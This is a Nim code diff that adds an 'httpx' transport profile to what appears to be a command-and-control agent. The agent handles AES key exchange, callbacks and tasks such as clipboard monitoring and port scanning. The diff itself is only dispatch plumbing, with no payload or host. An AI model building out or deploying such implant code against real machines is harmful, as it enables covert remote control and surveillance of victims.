@@ -3,6 +3,7 @@ import config
 import global_data
 import profiles/http_profile
 import profiles/websocket_profile
+import profiles/httpx_profile
 import utils/sysinfo
 import tasks/exit
 import tasks/sleep
@@ -82,7 +83,7 @@ type
     mtClipboardMonitor, mtPortscan
   
   ProfileKind = enum
-    pkHttp, pkWebSocket
+    pkHttp, pkWebSocket, pkHttpx
   
   Profile = object
     case kind: ProfileKind
@@ -90,6 +91,8 @@ type
       httpProfile: HttpProfile
     of pkWebSocket:
       wsProfile: WebSocketProfile
+    of pkHttpx:
+      httpxProfile: HttpxProfile
   
   Agent* = ref object
     config: Config
@@ -109,6 +112,8 @@ proc send(profile: var Profile, data: string, callbackUuid: string = ""): string
     result = profile.httpProfile.send(data, callbackUuid)
   of pkWebSocket:
     result = profile.wsProfile.send(data, callbackUuid)
+  of pkHttpx:
+    result = profile.httpxProfile.send(data, callbackUuid)
 
 proc setAesKey(profile: var Profile, key: seq[byte]) =
   case profile.kind
@@ -116,6 +121,8 @@ proc setAesKey(profile: var Profile, key: seq[byte]) =
     profile.httpProfile.setAesKey(key)
   of pkWebSocket:
     profile.wsProfile.setAesKey(key)
+  of pkHttpx:
+    profile.httpxProfile.setAesKey(key)
 
 proc hasAesKey(profile: Profile): bool =
   case profile.kind
@@ -123,6 +130,8 @@ proc hasAesKey(profile: Profile): bool =
     result = profile.httpProfile.hasAesKey()
   of pkWebSocket:
     result = profile.wsProfile.hasAesKey()
+  of pkHttpx:
+    result = profile.httpxProfile.hasAesKey()
 
 proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: string] =
   case profile.kind
@@ -130,6 +139,8 @@ proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: str
     result = profile.httpProfile.performKeyExchange()
   of pkWebSocket:
     result = profile.wsProfile.performKeyExchange()
+  of pkHttpx:
+    result = profile.httpxProfile.performKeyExchange()
 
 proc newAgent*(): Agent =
   ## Create a new agent instance
@@ -143,6 +154,8 @@ proc newAgent*(): Agent =
   case result.config.profile
   of "websocket":
     result.profile = Profile(kind: pkWebSocket, wsProfile: newWebSocketProfile())
+  of "httpx":
+    result.profile = Profile(kind: pkHttpx, httpxProfile: newHttpxProfile())
   else:  # Default to HTTP for "http" or any other value
     result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
   
